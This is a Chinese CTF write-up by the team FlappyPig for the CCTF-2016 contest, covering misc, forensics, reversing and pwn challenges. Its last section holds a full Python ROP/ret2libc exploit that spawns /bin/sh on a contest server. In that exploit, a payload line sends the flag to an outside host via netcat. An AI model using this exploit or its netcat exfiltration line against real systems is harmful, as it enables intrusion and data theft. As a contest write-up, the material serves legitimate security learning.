# FlappyPig CCTF-2016 WriteUp
|
##### 译文声明
本文是翻译文章，文章来源：FlappyPig
译文仅供参考，具体内容表达以及含义原文为准。
作者：FlappyPig
Misc
签到
源码。
Misc1
Misc2
EZ Game Misc
在数据包中发现了大量smb流量,目测为smb的某洞,先找到getshell的流,流里面的好东西不少,这里不做赘述:
把这几个和每个前后的steam看下,一共就几个找到:
Base64解码得到flag。
猜CVE编号(补丁编号),其实我第一次试的就是08067(都不用看流第一个想到的就是这个吧==)。
True or False Misc
Down下来丢到Winhex里看一下,
尝试加了各种压缩文件头都不行,后来主办方出了提示说bz2,把头改成42 5a 68 39 之后可以正常解压,发现true 和 false
两个bin文件,直接运行的话会弹一个误导提示。
丢给二进制队友,静态调试在true中print_f中发现关键点,最终得到Flag
Best_Easy_Misc
这个题有些蛋疼.. 下载下来之后OS X直接解压了,跳过了不少坑.丢到Winhex里
最开始以为是摩尔斯密码,解了几下发现不对,队友说可能是培根密码,统计了一下有1024个字节,把—换成A 把 . 换成B
,感觉像是二维码的样子,变以32X32排列。(其实最后没看清我用别的符号替代了)
这时候发现有些东西藏在里面,就把每个点扩大了3倍,再缩小视图,拿PS勾图,得到Flag。
Forensic
神秘的文件1
这题一开始完全没思路,不知道level1是什么,file了一下:
去搜了一圈发现这个是windows的vhd格式,于是把他附加到电脑上:
发现分区被bitlocker保护了,但是不知道密码,后来发现了一个软件Passware Kit
Forensic可以破解Bitlocker密码,这时候知道给的mem.vmem内存dump文件怎么用了,加载进来破解:
跑了一会就出来恢复密钥了:
然后,直接输入恢复密钥就能打开磁盘获得level1的flag:
神秘的文件2
不出意外的话这题应该是搞level1里面获得的level2文件,本来一直没思路,后来看了提示可以用取证神器volatility,所以就下了一个,看了一圈发现内存里对level2的描述比较奇怪:
Volatility看了一下屏幕截图:
感觉是用TrueCrypt加密了某些东西?那么用truecryptsummary看一下内存dump:
这里看到truecryptsummary的结果显示level2是一个挂载在H盘的一个TrueCrypt
container,那么密码是多少呢?用truecryptmaster看了一下,的确找到了master key。
感觉应该是正确思路?
用这个masterkey解密level2就行了?
然后在这里被坑了很久,一直都没头绪,他说加密算法是CAST,但是这个非常老旧已经被弃用的算法啊。。我从github上down下来truecrypt的源码,自己写了一个CAST解密程序,可是解密出来完全不对啊,于是默默的被坑了很久后来看到了提示:
搞了半天level2密码不在内存了。我也是醉了。可是密码在其他地方,到底在哪里呢?一点思路都没有?
最后。最后我还是搞定了。我应该是唯一一个做出来的,紫鹏大神你要请我吃饭。最后我把题目描述页面上所有可见字符串都当密码试过了。最后的密码是purpleroc,紫鹏大神,给你跪下了。得到flag:
、
Bin
Re1
md5_custom函数啥都没干,所以Flag为CCTF{f2332291a6e1e6154f3cf4ad8b7504d8}。
Re2
C#混淆,用de4dot解混淆。发现将flag发送到端口31337,所以开个端口接收一下。
Re3
输入:numbers:789101112131415123456可以打印出: oh mon dieu t'as reussi bravo ! mdp est
concatene ordre est 4 2 3 1,所以flag为 CCTF{789101112131415123456}。
2048?4096?
2048游戏,玩死了之后会将 score-turn-time 发送到固定服务器,然后服务器发回do not cheat!
不知道服务器怎么check的,试了分最大的情况也不行。
根据提示3,知道需要求分最小的情况。
分最小情况如下:
2 4 2 4
4 2 4 2
2 4 2 4
4 2 4 2
得分为16,turn为(所有数之和-4)/2=20,然后时间最开始写10s发现不行,试了下100s,得到了flag。
difffffffffffuse
输入40字节,经过几千轮变换,然后与固定40字节比较。
发现每轮变换都是单字节操作,所以可以一个个字节去爆破。
用gdb脚本在strcmp处下断点记录不同字符串变换后的结果。然后逐个去匹配。得到flag为CCTF{1f_Y0u_W4nNa_R3vEn93_____purpleroc}
import os
for i in range(1, 0x100):
print i
f = open('abc.txt', 'wb')
f.write(chr(i)*40)
f.close()
command = 'gdb ./difuse -x difuse.py'
os.popen(command)
os.popen('cp ./out.txt ./result'+str(i)+'.txt')
dict ={}
for i in range(1, 0x100):
f = open('./result'+str(i)+'.txt', 'rb')
dict[i] = f.read()
f.close()
f = open('./biaozhun','rb')
biaozhun = f.read()
f.close()
result = ''
for i in range(len(biaozhun)):
for j in range(1, 0x100):
if dict[j][i] == biaozhun[i]:
result += chr(j)
print i
break
print result  
---  
Simple pwn
代码逻辑非常简单,如下:
返回之前,把三个地址解析的int值,分别放在栈顶和作为返回地址,如下:
由于读取东西后,直接将socket从标准输入输出关闭了,所以没法直接再次读取东西,所以泄露和改写没法同时进行,在次,利用两次,第一次泄露,第二次直接改写,由于32位的程序,空间有限,可以撞上。利用代码如下:
__author__ = "pxx"
from zio import *
from pwn import *
target = "./pwn1"
target = ("115.28.241.138", 9000)
#target = ("127.0.0.1", 2333)
elf_path = "./pwn1"
def get_io(target):
r_m = COLORED(RAW, "green")
w_m = COLORED(RAW, "blue")
io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
return io
def get_elf_info(elf_path):
return ELF(elf_path)
def leak_addr(io):
#sample
main_addr = 0x0804852D
main_addr = 0x08048566
leave_ret = 0x08048498
p_ebp_ret = 0x0804866a
ppp_ret = 0x08048668
pppp_ret = 0x08048667
read_got = 0x0804a00c
read_plt = 0x080483b0
write_plt = 0x080483f0
atoi_got = 0x0804a024
setvbuf_plt = 0x08048400
stdout_got = 0x0804A040
io.read_until("welcome to cctfn")
#io.gdb_hint()
buffer_addr = 0x0804A060
rop_addr = buffer_addr + 30
ebp = rop_addr
v_1111 = str(leave_ret)
v_2222 = str(ebp)
v_3333 = str(p_ebp_ret)
#v_3333 = str(main_addr)
rop_chain = ""
rop_chain += l32(0x01010101)
rop_chain += l32(write_plt) + l32(ppp_ret) + l32(1) + l32(read_got) + l32(4)
rop_chain += l32(read_plt) + l32(ppp_ret) + l32(0) + l32(buffer_addr + 0x800)
+ l32(0x100)
rop_chain += l32(p_ebp_ret) + l32(buffer_addr + 0x800) + l32(leave_ret)
payload = ""
payload += v_1111 + "." + v_2222 + "." + v_3333 + "."
payload = payload.ljust(30, 'a')
payload += rop_chain
io.writeline(payload)
#io.interact()
#return
rop_chain = ""
rop_chain += l32(0x01010101)
#rop_chain += l32(setvbuf_plt) + l32(pppp_ret) + l32(stdout_got) + l32(0) +
l32(2) + l32(0)
#rop_chain += l32(write_plt) + l32(ppp_ret) + l32(1) + l32(read_got) + l32(4)
rop_chain += l32(read_plt) + l32(ppp_ret) + l32(0) + l32(read_got) + l32(12)
rop_chain += l32(read_plt) + l32(ppp_ret) + l32(read_got + 4)
payload = ""
payload += rop_chain
io.writeline(payload)
#io.interact()
data = io.read(4)
print [c for c in data]
read_addr = l32(data)
print "read_addr:", hex(read_addr)
#local
offset_system = 0x0003e800
offset_read = 0x000da8d0
offset_str_bin_sh = 0x15f9e4
#remote
"""
offset_read = 0x000dabd0
offset_system = 0x00040190
offset_str_bin_sh = 0x160a24
"""
#offset_read = int(raw_input("offset_read = "), 16)
#offset_system = int(raw_input("offset_system = "), 16)
libc_base = read_addr – offset_read
system_addr = libc_base + offset_system
bin_sh_addr = libc_base + offset_str_bin_sh
print "system_addr:", hex(system_addr)
print "bin_sh_addr:", hex(bin_sh_addr)
io.writeline(l32(system_addr) + "/bin/sh;")
io.interact()
import struct
def to_int(val):
return struct.unpack("i", struct.pack("I", val))[0]
def pwn(io):
#sample
main_addr = 0x0804852D
main_addr = 0x08048566
leave_ret = 0x08048498
p_ebp_ret = 0x0804866a
ppp_ret = 0x08048668
pppp_ret = 0x08048667
read_got = 0x0804a00c
read_plt = 0x080483b0
write_plt = 0x080483f0
atoi_got = 0x0804a024
setvbuf_plt = 0x08048400
stdout_got = 0x0804A040
io.read_until("welcome to cctfn")
#io.gdb_hint()
buffer_addr = 0x0804A060
rop_addr = buffer_addr + 40
ebp = rop_addr
v_1111 = str(leave_ret)
v_2222 = str(ebp)
v_3333 = str(p_ebp_ret)
#v_3333 = str(main_addr)
#local
real_read_addr = 0xf76e18d0
system_addr = 0xf7645800
bin_sh_addr = 0xf77669e4
#remote
#"""
real_read_addr = 0xb76babd0
system_addr = 0xb7620190
bin_sh_addr = 0xb7740a24
#"""
#print to_int(bin_sh_addr)
#print to_int(system_addr)
v_2222 = str(to_int(buffer_addr+40))
v_3333 = str(to_int(system_addr))
v_1111 = v_2222
rop_chain = ""
rop_chain += l32(0x01010101)
rop_chain += l32(write_plt) + l32(ppp_ret) + l32(1) + l32(read_got) + l32(4)
rop_chain += l32(system_addr) + l32(bin_sh_addr)
rop_chain += l32(read_plt) + l32(ppp_ret) + l32(0) + l32(buffer_addr + 0x800)
+ l32(0x100)
rop_chain += l32(p_ebp_ret) + l32(buffer_addr + 0x800) + l32(leave_ret)
payload = ""
payload += v_1111 + "." + v_2222 + "." + v_3333 + "."
payload = payload.ljust(40, 'a')
payload += "cat flag | nc 120.27.114.63 8888;"
payload += rop_chain
io.writeline(payload)
#io.interact()
io.writeline("id")
data = io.read_until("n")
print data